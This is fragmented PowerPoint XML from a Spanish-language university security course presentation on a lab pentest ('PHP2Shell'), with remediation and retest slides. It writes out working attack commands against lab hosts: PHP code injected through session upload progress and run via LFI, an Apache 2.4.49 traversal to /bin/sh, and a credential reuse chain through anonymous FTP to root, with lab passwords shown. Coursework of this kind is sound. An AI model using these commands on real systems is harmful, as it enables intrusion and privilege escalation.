y="524865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000000000072ffd0 T zval_ptr_dtor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58521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offset de otro build hace fallar el PoC aunque la versión sea la correcta.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Rony Churata Huacani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CHAIN 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convierte la sesión en RCE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pasos desde session.upload_progress hasta uid=33(www-data).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28800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23591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6700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session.upload_progress crea /tmp/sess_&lt;id&gt; con el contenido del request.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606040" y="274320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69164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1828800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9232" y="23591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Inyectar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99232" y="26700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 del campo y el valor introducen código PHP en la sesión.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937760" y="274320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66360" y="169164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0952" y="182880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30952" y="23591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30952" y="26700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sink LFI (/lfi.php) incluye el archivo /tmp/sess_&lt;id&gt;.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269480" y="274320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169164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62672" y="1828800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62672" y="23591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62672" y="26700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interpreta el código incluido en el contexto del worker.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601200" y="274320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29800" y="169164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4392" y="1828800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94392" y="23591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994392" y="267004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devuelve www-data; se escribe PWNED-M1-www-data.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29768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chain_a_session_lfi.py --host 10.10.10.11 --port 8080 \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77240" y="452628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--inject-path /index.php --lfi-path /lfi.php --session-path /tmp --command "id; hostname"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77240" y="480060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RCE CONFIRMED: uid=33(www-data) gid=33(www-data) groups=33(www-data)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se ejecuta desde M1: session injection + inclusión de sesión. Después se escala por B3 → SSH → sudo y se cierra con parche.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Fabiola Ancco Rafael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W2 · COMANDOS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pasos, comando y explicación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teclea en Kali/M1 y lo que debe devolver cada paso.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37360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16276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-c sid.txt -b sid.txt -F "PHP_SESSION_UPLOAD_PROGRESS=&lt;?php system($_GET['c']); ?&gt;" http://10.10.10.11:8080/index.php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la sesión y deja el archivo /tmp/sess_&lt;sid&gt; con el código inyectado.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58368" y="2542032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243230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-b sid.txt http://10.10.10.11:8080/index.php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583680" y="24505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el mismo worker y confirma que la sesión persiste.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1106424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346704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323697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"http://10.10.10.11:8080/lfi.php?f=/tmp/sess_&lt;sid&gt;"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6583680" y="32552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LFI incluye el archivo de sesión; PHP interpreta el código.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58368" y="4151376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404164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"http://10.10.10.11:8080/lfi.php?f=/tmp/sess_&lt;sid&gt;&amp;c=id"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583680" y="40599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id y devuelve uid=33(www-data).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1106424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956048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70432" y="48463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ubuntu@10.10.10.11   # Admin13.-</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="720" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr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id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583680" y="48646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 la clave de B3 y escala a root con sudo.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2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se crea con upload_progress; el LFI la incluye; el comando se ejecuta como www-data. Después se escala por B3/SSH/sudo.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Marco Nina Cruz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OTRA VÍA · W3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2.4.49: traversal y RCE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segundo camino a www-data, independiente de PHP2Shell.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explota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2.4.49 permite traversal de rutas. Con CGI habilitado, la ruta llega a /bin/sh y ejecuta comandos como el usuario del servicio.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760720" cy="1508760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8485"/>
            </a:avLst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--path-as-is 'http://10.10.10.11:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' \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'echo Content-Type: text/plain; echo; id'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uid=33(www-data) gid=33(www-data) groups=33(www-data)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502920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4848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Apache 2.4.49 con CGI operativo.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784848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 traversal llega a /bin/sh.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784848" y="2825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 comando se ejecuta como www-data.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784848" y="3209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Evidencia: EV-005-M1-03.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y W2 llegan al mismo nivel; se usan como rutas alternativas y se parchean por separado.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Erick Ramos Vera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OTRA VÍA · B3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anónimo: la llave maestra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backup en M3 a root en M1 por reutilización de credenciales.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explota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FTP de M3 permite acceso anónimo y expone /backups. Dentro está credenciales.txt con la clave Admin13.-, la misma que usa ubuntu en M1.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760720" cy="1417320"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9032"/>
            </a:avLst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ftp://anonymous:anonymous@10.10.10.13/backups/credenciales.txt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M4/M5: Admin13.-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D7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ubuntu@10.10.10.11   # Admin13.-   →   sudo id   →   uid=0(root)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502920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4848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FTP anónimo en M3.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784848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credenciales.txt en claro.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784848" y="2825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 clave se reutiliza en ubuntu.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784848" y="3209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sudo lleva a root; evidencia EV-ROOT-CHAIN.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es la cadena que convierte www-data en root: no es un exploit nuevo, es reutilización de credenciales.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Rony Churata Huacani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EVIDENCIA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quedó demostrado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Log, captura y SHA256; evidencia verificable.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916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EV-W2-07 · Chain A RCE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Image 0" descr="C:\Users\Jose Paye\dev\universidad\IS-EXAMEN-UNIDAD-1\informe\evidencias\png\EV-W2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058" y="1965960"/>
            <a:ext cx="4913267" cy="269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4754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injection + LFI → uid=33(www-data) desde M1.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713232" y="5093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  e9916fa598a6f11f…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6217920" y="1572768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2512" y="16916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EV-W2-09 · root y marcador</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="12" name="Image 1" descr="C:\Users\Jose Paye\dev\universidad\IS-EXAMEN-UNIDAD-1\informe\evidencias\png\EV-W2-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338" y="1965960"/>
            <a:ext cx="4913267" cy="269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4754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→ credenciales → SSH ubuntu → sudo → /root/PWNED-M1-root.txt.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6382512" y="5093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  30ebe1ebb93b76a9…</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="720" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="55595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555955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· EV-005-M1-03 y W2 Chain A · EV-W2-07/08 son los RCE reales de M1; root se cierra por B3/SSH/sudo.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Jose Paye Mamani</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="740" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 14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19" name="Text 15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IMPACTO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obtuvo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sí dio www-data por Chain A; root se cierra con B3, SSH y sudo.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713232"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1794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28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· PHP2Shell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15468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www-data (Chain A)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uid=33(www-data)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37960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6400800" cy="713232"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1794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803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· Apache 2.4.49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www-data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5029200" y="2880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uid=33(www-data)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6400800" cy="713232"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1794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931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+ M1-SSH · sudo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029200" y="39319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uid=0(root)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0" y="16459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real para root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20574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148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2404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· auditoría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372600" y="2743200"/>
            <a:ext cx="0" cy="27432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30175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3364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/ W2 Chain A → www-data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372600" y="3703320"/>
            <a:ext cx="0" cy="27432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0" y="39776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23A5E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="12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4069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4325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· Admin13.-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372600" y="4663440"/>
            <a:ext cx="0" cy="27432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15200" y="49377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5029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5285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id → uid=0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315200" y="5897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llega a www-data; root no proviene de W2: se cierra por B3 → SSH → sudo.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52120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entre “hay un CVE” y “se explotó” está en la evidencia: id, archivo o captura verificable.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Jose Paye Mamani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CADENA COMPLETA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Kali a root: cinco eslabones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paso se ejecuta en vivo y deja evidencia: W2, B3, SSH, sudo y marcadores.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103120" cy="28346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2880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2359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→ M1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" y="2670048"/>
            <a:ext cx="77724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670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Chain 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7512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injection + inclusión de sesión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606040" y="288036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691640"/>
            <a:ext cx="2103120" cy="28346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1828800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99232" y="2359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www-data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9232" y="2670048"/>
            <a:ext cx="77724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670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99232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+ PWNED-M1-www-data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4937760" y="288036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1691640"/>
            <a:ext cx="2103120" cy="28346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0952" y="1828800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09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30952" y="2359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FTP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0952" y="2670048"/>
            <a:ext cx="77724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0952" y="2670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30952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credenciales.txt: Admin13.-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7269480" y="288036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98080" y="1691640"/>
            <a:ext cx="2103120" cy="28346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62672" y="1828800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62672" y="2359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ubuntu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62672" y="2670048"/>
            <a:ext cx="77724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2670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662672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clave reutilizada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9601200" y="2880360"/>
            <a:ext cx="219456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829800" y="1691640"/>
            <a:ext cx="2103120" cy="2834640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 608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94392" y="1828800"/>
            <a:ext cx="411480" cy="41148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943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94392" y="2359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root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994392" y="2670048"/>
            <a:ext cx="777240" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 71429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94392" y="2670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994392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uid=0 + PWNED-M1-root.txt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548640" y="4892040"/>
            <a:ext cx="11109960" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 175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89204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RCE www-data + root, con marcadores y capturas EV-W2-07/08/09 y EV-ROOT-CHAIN.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réplica en vivo sigue el mismo orden: versión, precondiciones, PoC, evidencia y retest.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Erick · M3 Rony · M6 Jose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RESTO DE LA RED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hallazgos que sostienen la cadena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 y CVE que sí se demostraron en M2–M5.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46504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98448" y="17465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167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Redis sin autenticación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24505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Claves de BD en wp-config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" y="27340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Volcado: 12 y 487 tablas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9808" y="3017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Pivote desde M1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3172968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Retest: cerrado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4406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746504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22008" y="17465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3368" y="2167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FTP anónimo + credenciales.txt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73368" y="24505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NFS no_root_squash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73368" y="27340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Admin13.- reutilizada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73368" y="3017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Salto a M1/M4/M5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241280" y="3172968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Retest: cerrado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54406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941064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941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98448" y="39410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43616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 password_2026 (Pwn3d!)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9808" y="46451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AXFR de uni.lab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9808" y="49286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SYSTEM por tarea programada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9808" y="5212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Shares ADMIN$/C$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5367528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5367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Retest: cerrado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72200" y="3794760"/>
            <a:ext cx="54406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3941064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3941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22008" y="39410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73368" y="43616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VNC sin autenticación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73368" y="46451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whoami: desktop-dt5f05n\cliente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73368" y="49286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Clave reutilizada por SMB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73368" y="5212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Marcador PWNED-M5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241280" y="5367528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41280" y="5367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48640" y="589788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8978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y W3 son los RCE demostrados en M1; M4 llegó a SYSTEM con credenciales admin, no por privesc desde acceso limitado.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Doris · M3 Rony · M4 Fabiola · M5 Marco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· REMEDIACIÓN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cambió en cada máquina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y configuración aplicadas; M5 queda pendiente.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205740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0" y="15727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/ CONFIGURACIÓN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0561320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8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1106424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56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240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V+C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205740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8.4.26 · WP 7.0.1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="740" dirty="0"/>
          </a:p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2.4.49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8.4.27 · WP 7.0.2 · Apache 2.4.51</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="740" dirty="0"/>
          </a:p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upload_progress Off · LFI fuera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0332720" y="1993392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0" y="1993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4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990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V+C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2057400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6.2.6 · 6379 abierto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486400" y="26700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6.2.7 · requirepass · UFW</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="740" dirty="0"/>
          </a:p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de BD rotadas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10332720" y="2743200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0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4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1106424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3739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CFG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2057400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anónimo · NFS rw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5486400" y="341985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off · root_squash</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="740" dirty="0"/>
          </a:p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rotado · SMB2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10332720" y="3493008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4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4489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CFG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2057400" y="4169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SMBv1 · signing off · AXFR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5486400" y="416966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SMB1 off · signing on</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="740" dirty="0"/>
          </a:p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Spooler off · AXFR cerrado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0332720" y="4242816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0" y="42428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4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48640" y="4846320"/>
            <a:ext cx="1106424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" y="5239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2057400" y="4919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VNC/RDP/SMB abiertos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486400" y="49194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445/3389/5900 filtrados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10332720" y="4992624"/>
            <a:ext cx="1188720" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7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49926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4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6F7FB"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="E6F7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parcheo se aplicó en cada servidor; M1–M4 cerrados, M5 pendiente. V+C = versión + configuración; CFG = solo configuración.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· RETEST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verificación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comandos, ahora sobre el servicio corregido.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03504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-v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603504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8.4.27</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="690" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="60350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/lfi.php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603504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404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603504" y="3666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 7.0.2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603504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y LFI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0" y="160020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950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9504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2889504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redis-cli PING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2889504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NOAUTH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288950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-p6379</a:t>
            </a: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2889504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filtered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2889504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y puerto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29200" y="160020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550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75504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5175504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ftp://…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5175504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530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517550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showmount -e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5175504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root_squash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5175504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y NFS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15200" y="160020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61504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461504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nxc smb</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="690" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Text 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7461504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signing:True</a:t>
            </a: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746150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axfr</a:t>
            </a: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7461504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failed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7461504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y DNS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601200" y="160020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4750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747504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9747504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-p445,3389,5900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9747504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filtered</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="690" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="Text 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="974750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9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cambios</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="690" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="Text 42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9747504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filtrado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48640" y="49834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4983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M1–M4 verificados con los mismos comandos; M5 sigue filtrado y se declara pendiente, no remediado.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retest no se basa en la versión: repite el comando y compara la salida.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· CIERRE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lecciones de PHP2Shell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este caso enseña sobre versiones, PoCs y evidencia.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83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versión es el punto de partida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8.4.26 habilitó la cadena; el build NTS/prefork y los offsets reales permitieron ejecutar el exploit.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783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086600" y="18288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offsets son del binario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86600" y="21945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offsets de un writeup de Debian 12 hace fallar el PoC en Ubuntu 22.04. Se derivan con nm del libphp.so real.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840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+ B3 = root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A dio www-data; B3 expuso Admin13.-, SSH entró como ubuntu y sudo llegó a root. Cada eslabón tiene evidencia.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840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86600" y="38862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Parchear sí cambia el juego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86600" y="42519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8.4.27, upload_progress Off y LFI eliminado se verificaron en EV-007-RETEST; mitigar por configuración ya no fue suficiente.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fortaleza del trabajo no es “todos los CVE explotados”, sino la trazabilidad de qué se demostró, qué no y por qué.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3840480" cy="3840480"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00B8D9">
              <a:alpha val="14000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="00B8D9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réplica en vivo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demo sigue el orden del informe: version gate, precondiciones, PoC, evidencia y retest.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0325A"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A5B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11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3611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A RCE www-data · parcheado 8.4.27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4224528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0325A"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A5B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702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427024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real como www-data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882896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0325A"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A5B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286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92861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ubuntu/Admin13.- + sudo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completo · 6 integrantes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90372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8F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IS-1023 · UNAM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11002975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Universidad Nacional de Moquegua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PHP2Shell: del version gate a la explotación controlada</dc:title>
  <dc:subject>PHP2Shell - CVE-2026-109618 / CVE-2026-109619</dc:subject>
  <dc:creator>IS-1023 Seguridad de la Información</dc:creator>
  <cp:lastModifiedBy>IS-1023 Seguridad de la Información</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-10-29T14:23:14Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-10-29T14:23:14Z</dcterms:modified>
</cp:coreProperties>
</file>